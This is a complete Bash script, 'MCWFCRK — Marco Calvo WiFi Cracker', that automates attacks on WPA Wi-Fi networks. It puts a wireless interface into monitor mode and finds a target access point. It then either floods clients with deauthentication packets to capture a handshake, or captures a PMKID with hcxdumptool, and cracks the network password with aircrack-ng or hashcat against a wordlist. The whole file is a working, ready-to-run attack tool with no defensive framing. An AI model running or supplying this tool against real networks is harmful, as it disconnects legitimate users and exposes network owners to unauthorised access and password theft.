#!/bin/bash
tput civis 2>/dev/null
trap 'tput cnorm 2>/dev/null' EXIT INT TERM
clear

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
B='\033[0;34m'; P='\033[0;35m'; C='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

info() { echo -e "${BOLD}${B}  [*] $*${NC}"; }
ok()   { echo -e "${BOLD}${G}  [+] $*${NC}"; }
warn() { echo -e "${BOLD}${Y}  [!] $*${NC}"; }
bad()  { echo -e "${BOLD}${R}  [-] $*${NC}"; echo ""; exit 1; }
ask()  { tput cnorm 2>/dev/null; echo -ne "${BOLD}${P}  [?] $*${NC}"; }
sep()  { echo -e "\n${BOLD}${C}  ── $* ──${NC}\n"; }

install_package() {
  local package="$1"
  info "Installing $package"
  if command -v apt-get >/dev/null 2>&1; then
    if sudo apt-get update -qq >/dev/null 2>&1 \
      && sudo apt-get install -qq -y "$package" >/dev/null 2>&1; then
      ok "$package installed"
      return 0
    fi
  fi
  bad "Failed to install $package"
}

require_cmd() {
  local label="$1" package="$2"
  shift 2
  local cmds=("$@")
  local cmd

  [[ ${#cmds[@]} -eq 0 ]] && cmds=("$package")

  cmds_available() {
    for cmd in "${cmds[@]}"; do
      command -v "$cmd" >/dev/null 2>&1 || return 1
    done
  }

  if cmds_available; then
    ok "$label OK"
    return
  fi

  warn "$label not found"
  install_package "$package"
  cmds_available || bad "$label not available after installing $package"
  ok "$label OK"
}

net_iface_exists() {
  [[ -n "$1" && -e "/sys/class/net/$1" ]]
}

resolve_raw_iface() {
  local mon="$1"
  local name wiphy type

  if [[ "$mon" == *mon ]]; then
    name="${mon%mon}"
    net_iface_exists "$name" && { echo "$name"; return; }
    echo "$name"
    return
  fi

  name=$(sudo airmon-ng 2>/dev/null | awk -v m="$mon" '$2==m {print $2; exit}')
  if net_iface_exists "$name"; then
    echo "$name"
    return
  fi

  wiphy=$(iw dev "$mon" info 2>/dev/null | awk '/wiphy/ {print $2}')
  if [[ -n "$wiphy" ]]; then
    for name in /sys/class/ieee80211/phy${wiphy}/device/net/*; do
      [[ -e "$name" ]] || continue
      name=$(basename "$name")
      [[ "$name" == "$mon" ]] && continue
      type=$(iw dev "$name" info 2>/dev/null | awk '/type/ {print $2; exit}')
      if [[ "$type" == "managed" ]] && net_iface_exists "$name"; then
        echo "$name"
        return
      fi
    done
  fi

  echo "$mon"
}

channel_from_csv() {
  local csv="$1" target="$2"
  [[ -f "$csv" ]] || return 1
  awk -F, -v b="$target" '
    $0 ~ /^BSSID/ { ap=1; next }
    $0 ~ /^Station MAC/ { ap=0 }
    ap {
      gsub(/^ +| +$/, "", $1)
      if (toupper($1) == b) {
        gsub(/^ +| +$/, "", $4)
        print $4
        exit
      }
    }
  ' "$csv"
}

bssid_from_essid() {
  local csv="$1" essid="$2"
  [[ -f "$csv" ]] || return 1
  awk -F, -v s="$essid" '
    $0 ~ /^BSSID/      { ap=1; next }
    $0 ~ /^Station MAC/ { ap=0 }
    ap {
      gsub(/^ +| +$/, "", $1)
      gsub(/^ +| +$/, "", $14)
      if ($14 == s) { print toupper($1); exit }
    }
  ' "$csv"
}

detect_target_channel() {
  local ch_base="/tmp/mcwf_ch_${ts}"
  local csv="${ch_base}-01.csv"
  local t ch

  info "Detecting channel for BSSID $bssid"
  sudo airodump-ng "$monitor_iface" --band bga --bssid "$bssid" -w "$ch_base" \
    >/dev/null 2>&1 &
  local detect_pid=$!

  for ((t=0; t<60; t++)); do
    ch=$(channel_from_csv "$csv" "$bssid")
    [[ -n "$ch" && "$ch" =~ ^[0-9]+$ ]] && break
    sleep 0.5
  done

  kill "$detect_pid" 2>/dev/null
  sudo pkill -f "airodump-ng ${monitor_iface}.*--bssid ${bssid}" 2>/dev/null
  wait "$detect_pid" 2>/dev/null
  rm -f "${ch_base}"* 2>/dev/null

  [[ -n "$ch" && "$ch" =~ ^[0-9]+$ ]] \
    || bad "Could not detect channel for BSSID $bssid. Check signal and try again"
  channel="$ch"
  ok "Channel detected: $channel"
}

join_macs() {
  local m list=""
  for m in "$@"; do
    [[ -n "$list" ]] && list+=", "
    list+="$m"
  done
  echo "$list"
}

handshake_sta_from_cap() {
  local cap="$1" ap="$2" apu="${2^^}" out

  [[ -f "$cap" && -s "$cap" ]] || return 1

  out=$(tcpdump -r "$cap" -nn -e 2>/dev/null \
    | awk -v b="$apu" '
      function ismac(x) { return toupper(x) ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/ }
      function note(sa, da) {
        sa = toupper(sa); da = toupper(da)
        if (sa == b && ismac(da)) cnt[da]++
        else if (da == b && ismac(sa)) cnt[sa]++
      }
      function tag(line, label,    p, v) {
        p = index(line, label)
        if (!p) return ""
        v = substr(line, p + length(label), 17)
        return ismac(v) ? toupper(v) : ""
      }
      /EAPOL|888E/ {
        line = toupper($0)
        note(tag(line, "SA:"), tag(line, "DA:"))
      }
      END {
        best = ""; n = 0
        for (m in cnt) if (cnt[m] > n) { n = cnt[m]; best = m }
        if (best != "") print best
      }')
  [[ -n "$out" ]] && echo "$out"
}

handshake_sta_from_csv() {
  local csv="$1" ap="$2"
  [[ -f "$csv" ]] || return 1
  awk -F, -v b="${ap^^}" '
    BEGIN { best = -1; mac = "" }
    $0 ~ /^Station MAC/ { st=1; next }
    st {
      gsub(/^ +| +$/, "", $1)
      gsub(/^ +| +$/, "", $5)
      gsub(/^ +| +$/, "", $6)
      if (toupper($6) == b && toupper($1) ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/) {
        pkts = $5 + 0
        if (pkts >= best) { best = pkts; mac = toupper($1) }
      }
    }
    END { if (mac != "") print mac }
  ' "$csv"
}

resolve_handshake_sta() {
  local cap="$1" csv="$2" ap="$3" fallback="$4" sta=""

  sta=$(handshake_sta_from_cap "$cap" "$ap")
  [[ -n "$sta" ]] && { echo "$sta"; return 0; }

  [[ -n "$fallback" ]] && { echo "$fallback"; return 0; }

  sta=$(handshake_sta_from_csv "$csv" "$ap")
  [[ -n "$sta" ]] && echo "$sta"
}

list_client_macs() {
  local csv="$1" ap="$2"
  [[ -f "$csv" ]] || return 1
  awk -F, -v b="${ap^^}" '
    $0 ~ /^Station MAC/ { st=1; next }
    st {
      gsub(/^ +| +$/, "", $1)
      gsub(/^ +| +$/, "", $6)
      $1 = toupper($1)
      if (toupper($6) == b && $1 ~ /^([0-9A-F]{2}:){5}[0-9A-F]{2}$/ \
          && $1 != "FF:FF:FF:FF:FF:FF" && $1 != "00:00:00:00:00:00") print $1
    }
  ' "$csv" | awk '!seen[$0]++'
}

wait_for_clients() {
  local csv="$1" ap="$2" t
  for ((t=0; t<100; t++)); do
    list_client_macs "$csv" "$ap" | grep -q . && {
      list_client_macs "$csv" "$ap"
      return 0
    }
    sleep 0.1
  done
  return 1
}

stop_hcxdumptool() {
  sudo pkill -INT -x hcxdumptool 2>/dev/null
  local i
  for ((i=0; i<20; i++)); do
    sudo pgrep -x hcxdumptool >/dev/null 2>&1 || break
    sleep 0.5
  done
  sudo pkill -x hcxdumptool 2>/dev/null
  sleep 2
}

monitor_iface=""
raw_iface=""
phy_iface=""
monitor_activated=0
monitor_preexisting=0
wordlist=""
attack_mode="HANDSHAKE"
output_path=""
pmkid_timeout=45
deauth_count=5
requested_iface=""
requested_bssid=""
requested_essid=""
bssid=""
channel=""
ts=$(date +%s)
_cleaned=0

cleanup() {
  [[ $_cleaned -eq 1 ]] && return
  _cleaned=1
  tput cnorm 2>/dev/null
  echo ""
  sep "Cleanup"

  pkill -f "xterm.*airodump" 2>/dev/null
  pkill -f "xterm.*aireplay" 2>/dev/null
  pkill -f "xterm.*Deauth " 2>/dev/null
  pkill -f "xterm.*aircrack" 2>/dev/null
  pkill -f "xterm.*hcxdumptool" 2>/dev/null
  pkill -f "xterm.*hashcat" 2>/dev/null
  sudo pkill -x aireplay-ng 2>/dev/null
  sudo pkill -x airodump-ng 2>/dev/null
  sudo pkill -x hcxdumptool 2>/dev/null
  sleep 1

  if [[ $monitor_activated -eq 1 && -n "$monitor_iface" ]]; then
    info "Deactivating monitor mode on $monitor_iface"
    sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1
    ok "Monitor mode deactivated"
  fi

  if [[ -z "$output_path" ]]; then
    rm -f /tmp/mcwf_*.cap /tmp/mcwf_*.csv /tmp/mcwf_*.netxml \
          /tmp/mcwf_*.pcapng /tmp/mcwf_*.hc22000 /tmp/mcwf_*.pot \
          /tmp/mcwf_*.key /tmp/mcwf_check_*.hc22000 /tmp/mcwf_ch_* 2>/dev/null
    ok "Temporary files removed"
  fi
  echo ""
}

trap 'cleanup; exit' EXIT
trap 'bad "Process interrupted"' INT TERM

while [[ $# -gt 0 ]]; do
  case "$1" in
    -w|--wordlist)
      wordlist="$2"; shift 2 ;;
    -a|--attack-mode)
      attack_mode="${2^^}"; shift 2 ;;
    -o|--output)
      output_path="$2"; shift 2 ;;
    -t|--timeout)
      [[ -z "${2:-}" ]] && bad "-t requires a value in seconds"
      pmkid_timeout="$2"; shift 2 ;;
    -d|--deauth)
      [[ -z "${2:-}" ]] && bad "-d requires a number of deauth packets"
      deauth_count="$2"; shift 2 ;;
    -i|--interface)
      [[ -z "${2:-}" ]] && bad "-i requires an interface name"
      requested_iface="$2"; shift 2 ;;
    -b|--bssid)
      [[ -z "${2:-}" ]] && bad "-b requires a BSSID"
      requested_bssid="$2"; shift 2 ;;
    -e|--essid)
      [[ -z "${2:-}" ]] && bad "-e requires an ESSID"
      requested_essid="$2"; shift 2 ;;
    -h|--help)
      echo ""
      echo -e "  Usage: sudo $0 -w <wordlist> [-i <interface>] [-b <bssid> | -e <essid>] [-a HANDSHAKE|PMKID] [-d <packets>] [-t <seconds>] [-o <outdir>]"
      echo ""
      echo -e "  Options:"
      echo -e "  \t-w, --wordlist <file>    Path to wordlist (required)"
      echo -e "  \t-i, --interface <name>   WiFi interface to use (e.g. wlan0, wlx782051e9b16f)"
      echo -e "  \t-b, --bssid <address>    Target BSSID (e.g. 30:1F:48:0E:DA:00)"
      echo -e "  \t-e, --essid <name>       Target network name (e.g "Moviestar_6781_5G")"
      echo -e "  \t-a, --attack-mode <mode> Attack mode: HANDSHAKE (default) or PMKID"
      echo -e "  \t-d, --deauth <count>     Deauth packets to send in HANDSHAKE mode (default: 5, max: 256)"
      echo -e "  \t-t, --timeout <seconds>  PMKID capture timeout (default: 45)"
      echo -e "  \t-o, --output <dir>       Directory to save capture and hash files"
      echo -e "  \t-h, --help               Show this help message and exit"
      echo ""
      exit 0 ;;
    *)
      bad "Invalid option: $1" ;;
  esac
done

[[ -n "$wordlist" ]] || bad "Wordlist required. Use -w or --wordlist"
[[ -f "$wordlist" ]] || bad "Wordlist not found: $wordlist"
[[ "$attack_mode" == "HANDSHAKE" || "$attack_mode" == "PMKID" ]] \
  || bad "Attack mode must be HANDSHAKE or PMKID"
[[ "$pmkid_timeout" =~ ^[0-9]+$ && $pmkid_timeout -ge 1 ]] \
  || bad "Timeout must be a positive number of seconds"
[[ "$deauth_count" =~ ^[0-9]+$ && $deauth_count -ge 1 && $deauth_count -le 256 ]] \
  || bad "Deauth count must be between 1 and 256"
[[ -z "$requested_bssid" || -z "$requested_essid" ]] \
  || bad "Use -b or -e, not both"
if [[ -n "$requested_bssid" ]]; then
  requested_bssid="${requested_bssid^^}"
  [[ "$requested_bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] \
    || bad "Invalid BSSID format"
fi

echo -e "\n${BOLD}${C}  MCWFCRK — Marco Calvo WiFi Cracker${NC}"
if [[ "$attack_mode" == "PMKID" ]]; then
  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Timeout: ${pmkid_timeout}s${NC}\n"
else
  echo -e "  ${BOLD}Mode: $attack_mode  |  Wordlist: $(basename "$wordlist")  |  Deauth: ${deauth_count} packets${NC}\n"
fi

sep "Environment"

if [[ $EUID -eq 0 ]] || sudo -v -n >/dev/null 2>&1; then
  ok "Privileges OK"
else
  bad "Run as root or with sudo"
fi

require_cmd "Aircrack-ng suite" aircrack-ng airmon-ng airodump-ng aireplay-ng
require_cmd "iw" iw
require_cmd "xterm" xterm

if [[ "$attack_mode" == "PMKID" ]]; then
  require_cmd "hcxdumptool" hcxdumptool
  require_cmd "hcxpcapngtool" hcxtools hcxpcapngtool
  require_cmd "hashcat" hashcat
else
  require_cmd "tcpdump" tcpdump
fi

sep "Monitor Interface"

if [[ -n "$requested_iface" ]]; then
  phy_iface="${requested_iface%mon}"
  net_iface_exists "$phy_iface" || net_iface_exists "$requested_iface" \
    || bad "Interface not found: $requested_iface"
  net_iface_exists "$phy_iface" || phy_iface="$requested_iface"
  raw_iface="$phy_iface"

  if [[ "$(iw dev "$requested_iface" info 2>/dev/null | awk '/type/ {print $2}')" == "monitor" ]]; then
    monitor_iface="$requested_iface"
    monitor_preexisting=1
    ok "Using monitor interface: $monitor_iface"
  elif [[ "$(iw dev "$phy_iface" info 2>/dev/null | awk '/type/ {print $2}')" == "monitor" ]]; then
    monitor_iface="$phy_iface"
    monitor_preexisting=1
    ok "Using monitor interface: $monitor_iface"
  else
    info "Activating monitor mode on $phy_iface"
    sudo airmon-ng start "$phy_iface" >/dev/null 2>&1 \
      || bad "Failed to activate monitor mode on $phy_iface"
    sleep 2
    monitor_iface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
    [[ -n "$monitor_iface" ]] || monitor_iface="${phy_iface}mon"
    monitor_activated=1
    ok "Monitor mode activated: $monitor_iface"
  fi
else
  for f in /sys/class/net/*/type; do
    [[ "$(cat "$f" 2>/dev/null)" == "803" ]] && {
      monitor_iface=$(basename "$(dirname "$f")")
      monitor_preexisting=1
      ok "Using existing monitor interface: $monitor_iface"
      break
    }
  done

  if [[ -z "$monitor_iface" ]]; then
    warn "No monitor interface found"
    echo ""
    sudo airmon-ng
    echo ""
    ask "Enter interface to activate monitor mode: "
    read -r phy_iface
    [[ -n "$phy_iface" ]] || bad "No interface provided"
    raw_iface="$phy_iface"

    info "Activating monitor mode on $phy_iface"
    sudo airmon-ng start "$phy_iface" >/dev/null 2>&1 \
      || bad "Failed to activate monitor mode on $phy_iface"
    sleep 2

    monitor_iface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
    [[ -n "$monitor_iface" ]] || monitor_iface="${phy_iface}mon"
    monitor_activated=1
    ok "Monitor mode activated: $monitor_iface"
  fi
fi

if [[ -z "$phy_iface" ]]; then
  phy_iface=$(resolve_raw_iface "$monitor_iface")
fi
if ! net_iface_exists "$phy_iface"; then
  phy_iface="$monitor_iface"
fi
raw_iface="$phy_iface"

ensure_monitor_active() {
  [[ $monitor_preexisting -ne 1 ]] && return
  local start="$phy_iface"
  sudo pkill -x airodump-ng 2>/dev/null
  sudo pkill -x aireplay-ng 2>/dev/null
  sudo pkill -x hcxdumptool 2>/dev/null
  sleep 1
  info "Restarting monitor mode on $start"
  sudo airmon-ng stop "$monitor_iface" >/dev/null 2>&1
  sleep 1
  sudo airmon-ng start "$start" >/dev/null 2>&1 \
    || bad "Failed to restart monitor mode on $start"
  sleep 2
  monitor_iface=$(sudo iwconfig 2>/dev/null | grep "Mode:Monitor" -B1 | head -1 | awk '{print $1}')
  [[ -n "$monitor_iface" ]] || monitor_iface="$start"
  phy_iface="$start"
  raw_iface="$phy_iface"
  ok "Monitor interface ready: $monitor_iface"
}

ensure_monitor_active

close_scan() {
  [[ -n "${scan_pid:-}" ]] && kill "$scan_pid" 2>/dev/null && wait "$scan_pid" 2>/dev/null
  sudo pkill -f "airodump-ng ${monitor_iface}" 2>/dev/null
}

sep "Target"

if [[ -n "$requested_bssid" ]]; then
  bssid="$requested_bssid"
  ok "BSSID: $bssid"
elif [[ -n "$requested_essid" ]]; then
  scan_base="/tmp/mcwf_scan_${ts}"
  info "Scanning for ESSID '$requested_essid'..."
  sudo airodump-ng "$monitor_iface" --band bga \
    -w "$scan_base" --output-format csv --write-interval 1 \
    >/dev/null 2>&1 &
  scan_pid=$!
  for ((t=0; t<60; t++)); do
    bssid=$(bssid_from_essid "${scan_base}-01.csv" "$requested_essid")
    [[ -n "$bssid" ]] && break
    sleep 0.5
  done
  close_scan
  rm -f "${scan_base}"* 2>/dev/null
  if [[ -z "$bssid" ]]; then
    bad "ESSID '$requested_essid' not found in scan. Try -b with BSSID directly."
  fi
  ok "Resolved: '$requested_essid'  →  $bssid"
else
  info "Opening network scan window on $monitor_iface"
  scan_base="/tmp/mcwf_scan_${ts}"
  xterm -geometry 100x30 -fn 9x15 -title "Network Scan" \
    -e "sudo airodump-ng $monitor_iface --band bga \
        -w $scan_base --output-format csv --write-interval 1" &
  scan_pid=$!
  sleep 1
  echo ""

  ask "Enter BSSID (MAC address) or ESSID (network name): "
  read -r target
  [[ -n "$target" ]] || bad "Target is required"

  close_scan

  if [[ "$target" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
    bssid="${target^^}"
    ok "BSSID: $bssid"
    rm -f "${scan_base}"* 2>/dev/null
  else
    info "Resolving ESSID '$target'..."
    bssid=$(bssid_from_essid "${scan_base}-01.csv" "$target")
    rm -f "${scan_base}"* 2>/dev/null
    if [[ -z "$bssid" ]]; then
      bad "ESSID '$target' not found in scan. Scan longer or use BSSID directly."
    fi
    ok "Resolved: '$target'  →  $bssid"
  fi
fi

detect_target_channel

if [[ -n "$output_path" ]]; then
  mkdir -p "$output_path" || bad "Cannot create output directory: $output_path"
  cap_base="${output_path}/mcwf_${ts}"
else
  cap_base="/tmp/mcwf_${ts}"
fi

ok "Target selected: BSSID $bssid on channel $channel"

attack_handshake() {
  sep "Handshake Capture"
  local capfile="${cap_base}-01.cap"
  local csv="${cap_base}-01.csv"
  local cap_pid captured=0 broadcast_done=0 broadcast_wait=0 deauth_was_active=0 status_active=0
  local -a attacked_clients=() current_clients=() pending_deauth=()
  local no_client_deadline="" last_chance_deadline="" last_hs_check=0
  local deauth_bin="aireplay-ng"
  [[ $EUID -ne 0 ]] && deauth_bin="sudo -n aireplay-ng"

  end_status() {
    [[ $status_active -eq 1 ]] && {
      echo -ne "\r\033[K"
      status_active=0
    }
  }

  show_status() {
    echo -ne "\r\033[K${BOLD}${Y}  [!] $1${NC}"
    status_active=1
  }

  handshake_captured() {
    local quick="${1:-}"
    [[ -f "$capfile" ]] || return 1
    if [[ "$quick" == "quick" ]] && command -v timeout >/dev/null 2>&1; then
      timeout 2 sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[1-9][0-9]* handshake"
    else
      sudo aircrack-ng "$capfile" 2>&1 | grep -qE "[1-9][0-9]* handshake"
    fi
  }

  report_handshake_capture() {
    local sta
    end_status
    sta=$(resolve_handshake_sta "$capfile" "$csv" "$bssid" "")
    [[ -n "$sta" ]] \
      && ok "Handshake captured from client ${sta}: $capfile" \
      || ok "Handshake captured: $capfile"
    captured=1
  }

  stop_all_deauths() {
    pending_deauth=()
    pkill -f "xterm.*Deauth " 2>/dev/null
    sudo pkill -x aireplay-ng 2>/dev/null
    sleep 0.3
    pkill -f "xterm.*Deauth " 2>/dev/null
  }

  deauth_active() {
    sudo pgrep -x aireplay-ng >/dev/null 2>&1
  }

  stop_capture_windows() {
    kill "$cap_pid" 2>/dev/null
    stop_all_deauths
    pkill -f "xterm.*Packet Capture" 2>/dev/null
    sudo pkill -f "airodump-ng ${monitor_iface}.*--bssid ${bssid}" 2>/dev/null
    wait "$cap_pid" 2>/dev/null
  }

  try_capture_handshake() {
    [[ $captured -eq 1 ]] && return 0
    if handshake_captured quick; then
      end_status
      stop_capture_windows
      report_handshake_capture
      return 0
    fi
    return 1
  }

  run_deauth_xterm() {
    local title="$1" target="$2" limit=$((deauth_count + 20)) inner
    if command -v timeout >/dev/null 2>&1; then
      inner="timeout -k 2 ${limit} ${deauth_bin} -0 ${deauth_count} -a ${bssid} -c ${target} ${monitor_iface}"
    else
      inner="${deauth_bin} -0 ${deauth_count} -a ${bssid} -c ${target} ${monitor_iface}"
    fi
    xterm -geometry 100x30 -fn 9x15 -title "$title" \
      -e "bash -c $(printf '%q' "${inner}; sleep 1")" &
  }

  process_deauth_queue() {
    deauth_active && return
    [[ ${#pending_deauth[@]} -eq 0 ]] && return
    local mac="${pending_deauth[0]}"
    pending_deauth=("${pending_deauth[@]:1}")
    launch_deauth_client "$mac"
  }

  launch_deauth_client() {
    local mac="$1"
    end_status
    info "Deauth attack on $mac ($deauth_count packets)"
    run_deauth_xterm "Deauth $mac" "$mac"
  }

  launch_broadcast_deauth() {
    end_status
    info "Broadcast deauth ($deauth_count packets)"
    run_deauth_xterm "Deauth broadcast" "FF:FF:FF:FF:FF:FF"
  }

  scan_clients() {
    current_clients=()
    mapfile -t current_clients < <(list_client_macs "$csv" "$bssid" 2>/dev/null || true)
  }

  attack_new_clients() {
    local mac a known
    for mac in "${current_clients[@]}"; do
      known=0
      for a in "${attacked_clients[@]}"; do
        [[ "$a" == "$mac" ]] && { known=1; break; }
      done
      [[ $known -eq 1 ]] && continue
      attacked_clients+=("$mac")
      pending_deauth+=("$mac")
      end_status
      ok "New client detected: $mac"
      no_client_deadline=""
    done
    process_deauth_queue
  }

  reset_no_client_timer() {
    no_client_deadline=$((SECONDS + 30))
  }

  start_last_chance_wait() {
    [[ -n "$last_chance_deadline" ]] && return
    broadcast_wait=0
    last_chance_deadline=$((SECONDS + 30))
  }

  clients_pending_attack() {
    local mac a known
    for mac in "${current_clients[@]}"; do
      known=0
      for a in "${attacked_clients[@]}"; do
        [[ "$a" == "$mac" ]] && { known=1; break; }
      done
      [[ $known -eq 0 ]] && return 0
    done
    return 1
  }

  ready_for_broadcast_countdown() {
    [[ $broadcast_done -eq 0 ]] || return 1
    deauth_active && return 1
    [[ ${#pending_deauth[@]} -gt 0 ]] && return 1
    clients_pending_attack && return 1
    return 0
  }

  info "Opening packet capture window on channel $channel"
  local cap_bin="airodump-ng"
  [[ $EUID -ne 0 ]] && cap_bin="sudo -n airodump-ng"
  xterm -geometry 100x30 -fn 9x15 -title "Packet Capture" \
    -e "${cap_bin} ${monitor_iface} -c ${channel} --bssid ${bssid} \
        -w ${cap_base} --write-interval 1" &
  cap_pid=$!
  ok "Capture running in background, listening for handshake"
  info "Monitoring clients, then executing deauth on first sight, one attack per client"

  for ((t=0; t<20; t++)); do
    [[ -f "$csv" ]] && break
    sleep 0.2
  done

  reset_no_client_timer

  while [[ $captured -eq 0 ]]; do
    scan_clients
    attack_new_clients

    if (( SECONDS >= last_hs_check + 1 )); then
      try_capture_handshake && break
      last_hs_check=$SECONDS
    fi

    if deauth_active; then
      deauth_was_active=1
    elif [[ $deauth_was_active -eq 1 ]]; then
      deauth_was_active=0
      process_deauth_queue
      if [[ $broadcast_wait -eq 1 ]]; then
        start_last_chance_wait
      elif ready_for_broadcast_countdown; then
        reset_no_client_timer
      fi
    fi

    [[ $broadcast_wait -eq 1 ]] && ! deauth_active && start_last_chance_wait

    if [[ $broadcast_done -eq 0 ]]; then
      if ready_for_broadcast_countdown; then
        [[ -z "$no_client_deadline" ]] && reset_no_client_timer
        if (( SECONDS >= no_client_deadline )); then
          end_status
          warn "No clients for 30s, executing broadcast deauth"
          stop_all_deauths
          launch_broadcast_deauth
          broadcast_done=1
          broadcast_wait=1
        else
          show_status "No clients detected ($((no_client_deadline - SECONDS))s until broadcast deauth)"
        fi
      else
        no_client_deadline=""
        end_status
      fi
    else
      if [[ -z "$last_chance_deadline" ]]; then
        end_status
      elif (( SECONDS >= last_chance_deadline )); then
        end_status
        break
      else
        show_status "Last opportunity to wait for a handshake... ($((last_chance_deadline - SECONDS))s)"
      fi
    fi

    sleep 0.3
  done

  if [[ $captured -eq 0 ]]; then
    end_status
    stop_capture_windows
    [[ -f "$capfile" ]] || bad "Capture file not found"
    info "Verifying handshake in capture file"
    if handshake_captured; then
      report_handshake_capture
    else
      bad "No handshake found. Retry with a connected client on the target AP"
    fi
  fi

  sep "Cracking"
  local keyfile="${cap_base}.key"
  info "Opening aircrack-ng window"
  xterm -geometry 100x40 -fn 9x15 -title "Aircrack-ng" \
    -e "bash -c 'sudo aircrack-ng -w \"$wordlist\" -b $bssid -l \"$keyfile\" \"$capfile\"; echo; sleep 3'" &
  local aircrack_xterm_pid=$!
  wait "$aircrack_xterm_pid"

  if [[ -f "$keyfile" && -s "$keyfile" ]]; then
    local pw
    pw=$(tr -d '\n' < "$keyfile")
    ok "Password cracked: $pw"
  else
    bad "Password not found in wordlist"
  fi
}

pmkid_captured() {
  local cap="$1" check="/tmp/mcwf_check_${ts}.hc22000"
  local bssid_clean filtered
  [[ -f "$cap" ]] || return 1
  rm -f "$check"
  sudo hcxpcapngtool "$cap" -o "$check" >/dev/null 2>&1 || return 1
  [[ -f "$check" && -s "$check" ]] || return 1
  bssid_clean=$(echo "$bssid" | tr -d ':' | tr '[:upper:]' '[:lower:]')
  filtered=$(awk -F'*' -v b="$bssid_clean" 'tolower($4)==b' "$check" 2>/dev/null)
  [[ -n "$filtered" ]]
}

attack_pmkid() {
  sep "PMKID Capture"
  local pmkid_file="${cap_base}.pcapng"
  local hash_file="${cap_base}.hc22000"
  local pmkid_ok=0 last_size=0 t size
  local ch_band="${channel}a"   # hcxdumptool: suffix is width (a = 20 MHz), not WiFi band

  info "Opening PMKID capture on $monitor_iface (channel $ch_band)..."
  xterm -geometry 100x30 -fn 9x15 -title "PMKID Capture" -hold \
    -e "sudo hcxdumptool -i $monitor_iface -w $pmkid_file -c $ch_band" &
  local pmkid_pid=$!

  for ((i=0; i<10; i++)); do
    sudo pgrep -x hcxdumptool >/dev/null 2>&1 && break
    sleep 0.5
  done

  sudo pgrep -x hcxdumptool >/dev/null 2>&1 \
    || bad "hcxdumptool did not start. Check the PMKID Capture window for errors"

  for ((t=pmkid_timeout; t>0; t--)); do
    sudo pgrep -x hcxdumptool >/dev/null 2>&1 || break
    if [[ -f "$pmkid_file" ]]; then
      size=$(stat -c%s "$pmkid_file" 2>/dev/null || echo 0)
      if [[ $size -gt $last_size ]]; then
        last_size=$size
        if pmkid_captured "$pmkid_file"; then
          pmkid_ok=1
          break
        fi
      fi
    fi
    printf "\r  ${BOLD}${B}[*] Waiting for PMKID capture: ${t}s${NC}   "
    sleep 1
  done
  echo ""

  [[ $pmkid_ok -eq 1 ]] && ok "PMKID captured"

  stop_hcxdumptool
  kill "$pmkid_pid" 2>/dev/null
  wait "$pmkid_pid" 2>/dev/null
  rm -f "/tmp/mcwf_check_${ts}.hc22000"

  [[ -f "$pmkid_file" ]] || bad "PMKID capture file not found"

  if [[ $pmkid_ok -eq 0 ]] && pmkid_captured "$pmkid_file"; then
    pmkid_ok=1
    ok "PMKID captured"
  fi

  info "Converting capture to hc22000 hash"
  rm -f "$hash_file"
  sudo hcxpcapngtool "$pmkid_file" -o "$hash_file" >/dev/null 2>&1 \
    || bad "hcxpcapngtool conversion failed"
  if [[ ! -f "$hash_file" || ! -s "$hash_file" ]]; then
    bad "No PMKID in capture for BSSID $bssid (AP may not expose PMKID)"
  fi
  local bssid_clean filtered
  bssid_clean=$(echo "$bssid" | tr -d ':' | tr '[:upper:]' '[:lower:]')
  filtered=$(awk -F'*' -v b="$bssid_clean" 'tolower($4)==b' "$hash_file")
  if [[ -n "$filtered" ]]; then
    echo "$filtered" > "$hash_file"
  else
    bad "No PMKID hash for BSSID $bssid (other APs were captured)"
  fi
  if ! grep -qE '^WPA\*' "$hash_file" 2>/dev/null; then
    bad "No PMKID hash found for this AP"
  fi

  ok "Hash file ready: $hash_file"

  sep "Cracking"
  local potfile="${cap_base}.pot"
  info "Opening hashcat window"
  xterm -geometry 100x40 -fn 9x15 -title "Hashcat PMKID" \
    -e "bash -c 'hashcat -m 22000 --force --potfile-path \"$potfile\" \"$hash_file\" \"$wordlist\"; echo; echo --- Result ---; hashcat -m 22000 --potfile-path \"$potfile\" --show \"$hash_file\"; echo; sleep 3'" &
  local hashcat_xterm_pid=$!
  wait "$hashcat_xterm_pid"

  local pw
  pw=$(hashcat -m 22000 --potfile-path "$potfile" --show "$hash_file" 2>/dev/null \
    | awk -F: '{print $NF}')
  if [[ -n "$pw" ]]; then
    ok "Password cracked: $pw"
  else
    bad "Password not found in wordlist"
  fi
}

[[ "$attack_mode" == "PMKID" ]] && attack_pmkid || attack_handshake

tput cnorm 2>/dev/null
ok "Process completed"
exit 0
